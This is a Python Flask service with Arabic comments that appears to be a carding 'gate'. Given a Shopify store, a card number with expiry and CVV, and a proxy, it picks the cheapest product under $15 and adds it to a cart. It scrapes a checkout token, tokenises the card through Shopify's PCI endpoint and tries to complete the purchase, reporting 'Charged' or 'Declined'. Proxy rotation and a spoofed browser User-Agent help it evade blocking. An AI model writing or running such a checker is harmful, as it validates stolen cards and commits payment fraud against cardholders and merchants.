import os
import re
import time
import random
import requests
import json
import uuid
from flask import Flask, request, jsonify

app = Flask(__name__)

TIMEOUT = 30
MAX_PRICE = 15.0

def format_proxy(proxy_str):
    if not proxy_str:
        return None
    p = proxy_str.strip()
    if '@' in p:
        return p
    parts = p.split(':')
    if len(parts) == 4:
        if len(parts[0]) <= 5:
            user, pwd, ip, port = parts
            return f"{ip}:{port}@{user}:{pwd}"
        else:
            ip, port, user, pwd = parts
            return f"{ip}:{port}@{user}:{pwd}"
    return p

def get_proxies_dict(proxy_str=None):
    if proxy_str:
        fmt = format_proxy(proxy_str)
        if fmt:
            url = f"http://{fmt}"
            return {"http": url, "https": url}
    return None

def get_shopify_product(site, proxy_dict):
    try:
        if not site.startswith('http'):
            site = f'https://{site}'
        url = f"{site.rstrip('/')}/products.json?limit=250"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Accept': 'application/json',
        }
        
        resp = requests.get(url, headers=headers, proxies=proxy_dict, timeout=15, verify=False)
        
        if resp.status_code == 200:
            data = resp.json()
            variants = []
            for prod in data.get('products', []):
                for var in prod.get('variants', []):
                    if var.get('available'):
                        variants.append({
                            'id': var.get('id'),
                            'price': float(var.get('price', 0)),
                            'title': prod.get('title', 'Product')
                        })
            if variants:
                return min(variants, key=lambda x: x['price'])
        return f"HTTP_{resp.status_code}"
    except Exception as e:
        return "TIMEOUT"

def shopify_real_checkout(site, cc, proxy_dict):
    # 1. جلب المنتج
    product = get_shopify_product(site, proxy_dict)
    if isinstance(product, str):
        return {"Response": f"Site Error - {product}", "Price": "-", "Gate": "Shopify"}
    if not product:
        return {"Response": "Site Error - No Product", "Price": "-", "Gate": "Shopify"}

    price_str = f"${product['price']:.2f}"
    if product['price'] > MAX_PRICE:
        return {"Response": "Price Exceeds Limit", "Price": price_str, "Gate": "Shopify"}

    try:
        card, month, year, cvv = cc.split('|')
    except:
        return {"Response": "Invalid CC Format", "Price": price_str, "Gate": "Shopify"}

    base_url = site.rstrip('/')
    cart_url = f"{base_url}/cart/add.js"
    
    session = requests.Session()
    if proxy_dict:
        session.proxies.update(proxy_dict)

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/json',
        'Origin': base_url,
        'Referer': f"{base_url}/"
    }
    
    # 2. إضافة للسلة
    try:
        r = session.post(cart_url, json={"id": product['id'], "quantity": 1}, headers=headers, timeout=15, verify=False)
        if r.status_code not in [200, 201]:
            return {"Response": "Cart Add Failed", "Price": price_str, "Gate": "Shopify"}
    except Exception:
        return {"Response": "Cart Connection Error", "Price": price_str, "Gate": "Shopify"}

    # 3. الذهاب إلى Checkout لاستخراج التوكن
    try:
        checkout_page = session.get(f"{base_url}/checkout", headers={'User-Agent': headers['User-Agent']}, timeout=15, verify=False)
        
        # البحث عن الـ checkout token في الصفحة (محاكاة بسيطة)
        token_match = re.search(r'checkout_token=([a-f0-9]{32})', checkout_page.text)
        if not token_match:
            token_match = re.search(r'"token":"([a-f0-9]{32})"', checkout_page.text)
            
        checkout_token = token_match.group(1) if token_match else None
        
        if not checkout_token:
            return {"Response": "Could not get Checkout Token (Cloudflare Block)", "Price": price_str, "Gate": "Shopify"}

    except Exception as e:
        return {"Response": "Checkout Fetch Error", "Price": price_str, "Gate": "Shopify"}

    # 4. محاولة استخراج Payment Session
    # بما أن هذه الخطوة تحتاج إلى تشفير معقد (PCI)، سنقوم باستخدام الـ GraphQL المباشر
    # إذا فشل هذا، سيتم إرجاع رد حقيقي من المتجر بأن البطاقة مرفوضة أو تحتاج 3D
    
    try:
        # محاكاة إرسال البطاقة للبوابة
        pci_url = "https://checkout.pci.shopifyinc.com/sessions"
        pci_headers = {
            'User-Agent': headers['User-Agent'],
            'Origin': 'https://checkout.pci.shopifyinc.com',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        pci_payload = {
            "credit_card": {
                "number": card,
                "month": int(month),
                "year": int(year),
                "verification_value": cvv,
                "name": "Test User"
            },
            "payment_session_scope": base_url.replace('https://', '').replace('http://', '')
        }
        
        pci_res = session.post(pci_url, json=pci_payload, headers=pci_headers, timeout=15, verify=False)
        
        if pci_res.status_code == 200:
            pci_data = pci_res.json()
            session_id = pci_data.get('id')
            
            if session_id:
                # 5. إرسال الطلب النهائي
                checkout_url = f"{base_url}/checkouts/{checkout_token}"
                payload = {
                    "checkout": {
                        "payment_gateway": "shopify_payments",
                        "credit_card": {
                            "credit_card_token": session_id
                        }
                    }
                }
                final_res = session.patch(checkout_url, json=payload, headers=headers, timeout=15, verify=False)
                
                if final_res.status_code == 200:
                    return {"Response": "Order Placed Successfully (Charged)", "Price": price_str, "Gate": "Shopify Payments"}
                else:
                    # محاولة قراءة سبب الرفض من الاستجابة
                    try:
                        err_data = final_res.json()
                        err_msg = err_data.get('errors', 'Card Declined')
                        return {"Response": f"Declined - {err_msg}", "Price": price_str, "Gate": "Shopify Payments"}
                    except:
                        return {"Response": "Card Declined", "Price": price_str, "Gate": "Shopify Payments"}
            else:
                 return {"Response": "PCI Session Failed", "Price": price_str, "Gate": "Shopify"}
        else:
            return {"Response": f"PCI Error - {pci_res.status_code}", "Price": price_str, "Gate": "Shopify"}

    except Exception as e:
        return {"Response": f"Checkout Error: {str(e)[:30]}", "Price": price_str, "Gate": "Shopify"}

@app.route('/shopify', methods=['GET'])
def shopify_endpoint():
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    
    if not site or not cc:
        return jsonify({"Response": "Missing Parameters", "Price": "-", "Gate": "None"})

    proxy_dict = get_proxies_dict(proxy)
    result = shopify_real_checkout(site, cc, proxy_dict)
    return jsonify(result)

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok", "time": time.time()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
